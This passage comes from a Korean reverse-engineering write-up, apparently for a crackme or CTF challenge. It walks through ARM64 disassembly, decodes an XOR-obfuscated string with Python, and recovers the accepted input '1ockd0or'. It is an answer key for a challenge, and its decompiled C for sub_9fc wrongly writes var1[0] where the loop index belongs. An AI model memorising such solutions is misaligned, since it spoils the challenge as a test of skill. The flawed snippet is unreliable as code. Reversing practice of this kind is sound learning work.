class="hljs-number">000060</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">3</span>, x<span class="hljs-number">0</span> <span class="hljs-attribute">a84</span>:   <span class="hljs-number">4</span>a<span class="hljs-number">010041</span>    eor w<span class="hljs-number">1</span>, w<span class="hljs-number">2</span>, w<span class="hljs-number">1</span> <span class="hljs-attribute">a88</span>:   <span class="hljs-number">12001</span>c<span class="hljs-number">21</span>    and w<span class="hljs-number">1</span>, w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>xff <span class="hljs-attribute">a8c</span>:   <span class="hljs-number">39000001</span>    strb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">a90</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a94</span>:   <span class="hljs-number">11000400</span>    add w<span class="hljs-number">0</span>, w<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">a98</span>:   b<span class="hljs-number">90037</span>e<span class="hljs-number">0</span>    str w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">a9c</span>:   b<span class="hljs-number">94037</span>e<span class="hljs-number">1</span>    ldr w<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #52]</span> <span class="hljs-attribute">aa0</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">aa4</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">aa8</span>:   <span class="hljs-number">54</span>fffccb    b.lt    a<span class="hljs-number">40</span> &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt;  // b.tstop <span class="hljs-attribute">aac</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">ab0</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">47</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #64</span><span class="hljs-meta"> ab4:   d65f03c0    ret</span></code></pre><p>&#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC740; &#xAC12;&#xC744; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <code>w1</code>&#xACFC; <code>w3</code>&#xC740; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xBBC0;&#xB85C; <code>x0</code>, <code>x2</code>&#xC5D0; &#xB4E4;&#xC5B4;&#xC628; &#xAC12;&#xC744; &#xBCF4;&#xBA74; <code>[sp + #40] = \xFC\x7F\x65\x79\xFF\x73\x6C\x7D\xF4\x77\x6D\x61\xE7\x6B\x74\x65\xEC\x6F\x75\x69\xEF\x63\x46\x53\xDA\x5D\x47\x57\xD1\x51\x4E\x5B\xD2\x55\x4F\x5F\xD9\x49\x56\x43\xCA\x4D\x57\x47\xC1\x41\x5E\x4B\xA9\x28\x30\x22\xA2\x2C\x31\x26\xA1\x20</code>, <code>[sp + #24] = \x96\x19\x7\x11\x99\x19\x2\x11</code> &#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD0DD;&#xC5D0; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD55C; &#xD6C4; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; &#xAE38;&#xC774;+1 &#xB9CC;&#xD07C; <code>malloc</code>&#xC744; &#xD574;&#xC900; &#xD6C4; <code>sp+#56</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C; <code>malloc</code>&#xD55C; &#xC8FC;&#xC18C;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; index&#xC5D0; 0x0&#xC744; &#xB123;&#xC5B4;&#xC8FC;&#xACE0; <code>sp+#52</code>&#xC5D0; 0&#xC744; &#xC800;&#xC7A5;&#xD574;&#xC900; &#xD6C4; <code>a9c</code>&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>a9c</code>&#xC5D0;&#xC11C;&#xB294; 0&#xC744; <code>w1</code>&#xC5D0; &#xB123;&#xACE0; &#xCCAB; &#xBC88;&#xC9F8; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xB97C; <code>w0</code>&#xC5D0; &#xBD88;&#xB7EC;&#xC628; &#xD6C4; &#xB450; &#xAC1C;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xC5EC; <code>a40</code>&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. <code>w1=w0</code>&#xC774; &#xB418;&#xBA74; <code>flag</code>&#xAC00; <code>0</code>&#xC73C;&#xB85C; &#xC138;&#xD305;&#xB418;&#xACE0; <code>b.lt</code> &#xC5F0;&#xC0B0;&#xC774; &#xC218;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xCCAB; &#xBC88;&#xC9F8; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xB9CC;&#xD07C; &#xBC18;&#xBCF5;&#xD558;&#xB294; &#xAD6C;&#xAC04;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>a40</code>&#xC5D0;&#xC11C; <code>[sp+#40 + sp+#52]</code>&#xC758; &#xAC12;&#xC744; <code>w2</code>&#xC5D0; &#xB123;&#xACE0; <code>w3</code>&#xC5D0;&#xB294; <code>sp+#52 - sp+#32 * (sp+#52 / sp+#32)</code> &#xC5F0;&#xC0B0;&#xC744; &#xD1B5;&#xD574; <code>sp+#52 % sp+#32</code> &#xB97C; &#xC218;&#xD589;&#xD55C; &#xD6C4; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xB450; &#xBB38;&#xC790;&#xC5F4;&#xC744; <code>xor</code> &#xC5F0;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>sub_9fc</code> &#xB97C; c&#xB85C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// sub_9fc</span><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sub_9fc</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* param1, <span class="hljs-keyword">int</span> param2, <span class="hljs-keyword">char</span>* param3, <span class="hljs-keyword">int</span> param4)</span></span><span class="hljs-function"></span>{ &#xA0; &#xA0;<span class="hljs-keyword">char</span>* var1 = <span class="hljs-built_in">malloc</span>(param2 + <span class="hljs-number">1</span>); &#xA0; &#xA0;var1[param2] = <span class="hljs-string">&apos;\0&apos;</span>; &#xA0; &#xA0;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; param2; i++) &#xA0;  { &#xA0; &#xA0; &#xA0; &#xA0;var1[<span class="hljs-number">0</span>] = (param1[i] ^ param3[i % param4]) &amp; <span class="hljs-number">0xff</span>; &#xA0;  } &#xA0; &#xA0;<span class="hljs-keyword">return</span> var1;}</code></pre><p>&#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xB4E4;&#xC774; <code>sub_9fc</code>&#xB97C; &#xAC70;&#xCCD0; &#xC5B4;&#xB5A0;&#xD55C; &#xAC12;&#xC774; &#xB098;&#xC624;&#xB294;&#xC9C0; &#xAD6C;&#xD558;&#xB294; python &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">string1 = [ &#xA0; &#xA0;<span class="hljs-number">0xF7</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xFF</span>, &#xA0; &#xA0;<span class="hljs-number">0x73</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x65</span>, &#xA0; &#xA0;<span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x47</span>, &#xA0; &#xA0;<span class="hljs-number">0x57</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x56</span>, &#xA0; &#xA0;<span class="hljs-number">0x43</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x30</span>, &#xA0; &#xA0;<span class="hljs-number">0x22</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x20</span>]string2 = [<span class="hljs-number">0x96</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x11</span>]result = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string1)): &#xA0; &#xA0;result += chr(string1[i] ^ string2[i % len(string2)])print(result)<span class="hljs-string">&apos;&apos;&apos;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">&apos;&apos;&apos;</span></code></pre><p><code>sub_9fc</code>&#xAE4C;&#xC9C0; &#xB9C8;&#xCCE4;&#xC73C;&#xB2C8; &#xB2E4;&#xC2DC; main&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00;&#xC8E0;!</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{ &#xA0; &#xA0;<span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>); &#xA0; &#xA0;<span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8()); &#xA0; &#xA0;sub_96c(); &#xA0; &#xA0;<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1); &#xA0; &#xA0;sub_b30(var1, var2); &#xA0; &#xA0;<span class="hljs-built_in">free</span>(var1); &#xA0; &#xA0;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xC81C; &#xC785;&#xB825; &#xAC12;&#xC744; &#xBC1B;&#xC544;&#xC11C; <code>sub_b30</code>&#xD558;&#xB294; &#xAC83;&#xB9CC; &#xB0A8;&#xC558;&#xB124;&#xC694;. <code>sub_b30</code> &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">0000000000000b30</span> &lt;sub_b<span class="hljs-number">30</span>&gt;: <span class="hljs-attribute">b30</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> b34:   910003fd    mov x29, sp</span><span class="hljs-meta"> b38:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">b3c</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">1</span>    str x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b40</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b44</span>:   <span class="hljs-number">91001800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">6</span> <span class="hljs-attribute">b48</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b4c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b50</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">b54</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b58</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b5c</span>:   <span class="hljs-number">54000761</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b60</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b64</span>:   <span class="hljs-number">91001000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">4</span> <span class="hljs-attribute">b68</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b6c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b70</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b74</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b78</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b7c</span>:   <span class="hljs-number">54000661</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b80</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b84</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b88</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b8c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b90</span>:   <span class="hljs-number">91002800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xa <span class="hljs-attribute">b94</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b98</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b9c</span>:   <span class="hljs-number">54000561</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">ba0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ba4</span>:   <span class="hljs-number">91001</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">7</span> <span class="hljs-attribute">ba8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bac</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bb0</span>:   <span class="hljs-number">91004400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">11</span> <span class="hljs-attribute">bb4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bb8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bbc</span>:   <span class="hljs-number">54000461</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">bc0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">bc4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">bc8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bcc</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bd0</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">bd4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bd8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bdc</span>:   <span class="hljs-number">54000361</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">be0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">be4</span>:   <span class="hljs-number">91001400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">5</span> <span class="hljs-attribute">be8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bec</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bf0</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">34</span> <span class="hljs-attribute">bf4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bf8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bfc</span>:   <span class="hljs-number">54000261</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c00</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c04</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c08</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c0c</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">35</span> <span class="hljs-attribute">c10</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c14</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c18</span>:   <span class="hljs-number">54000181</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c1c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c20</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c24</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c28</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c2c</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c30</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c34</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c38</span>:   <span class="hljs-number">54000081</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c3c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c40</span>:   <span class="hljs-number">97</span>ffffab    bl  aec &lt;sub_aec&gt; <span class="hljs-attribute">c44</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">c48</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> c4c:   d65f03c0    ret</span></code></pre><p>&#xC704;&#xC5D0;&#xC11C; &#xBCF5;&#xD638;&#xD654;&#xD55C; <code>[a-zA-Z0-9]</code> &#xAC12;&#xACFC; &#xC785;&#xB825; &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD558;&#xB098;&#xC529; &#xBE44;&#xAD50;&#xD55C; &#xD6C4; &#xC870;&#xAC74;&#xC774; &#xBAA8;&#xB450; &#xB9DE;&#xC73C;&#xBA74; <code>x0</code>&#xC5D0;  input &#xAC12;&#xC744; &#xB123;&#xACE0; <code>sub_aec</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xAC12;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>var1[0x6] == var2[0xe]</li><li>var1[0x4] == var2[0x3]</li><li>var1[0x3] == var2[0xa]</li><li>var1[0x7] == var2[0x11]</li><li>var1[0x1] == var2[0xe]</li><li>var1[0x5] == var2[0x34]</li><li>var1[0x0] == var2[0x35]</li><li>var1[0x2] == var2[0x2]</li></ul><p>&#xC21C;&#xC11C;&#xC5D0; &#xB9DE;&#xCDB0;&#xC11C; &#xBC30;&#xC5F4;&#xD558;&#xBA74; input &#xAC12;&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">user_input = <span class="hljs-string">&quot;&quot;</span>user_input += result[<span class="hljs-number">0x35</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x2</span>] + result[<span class="hljs-number">0xa</span>] + result[<span class="hljs-number">0x3</span>] +result[<span class="hljs-number">0x34</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x11</span>]print(user_input)<span class="hljs-string">&apos;&apos;&apos;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">&apos;&apos;&apos;</span></code></pre><p>&#xC870;&#xAC74;&#xC774; &#xB9DE;&#xB294; &#xC785;&#xB825; &#xAC12;&#xC744; &#xC778;&#xC790;&#xB85C; <code>sub_aec</code> &#xAC12;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB2C8; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">value2</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">38</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">43</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">45</span>, <span class="hljs-number">0</span>xE, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>C,<span class="hljs-attribute">0x8</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>, <span 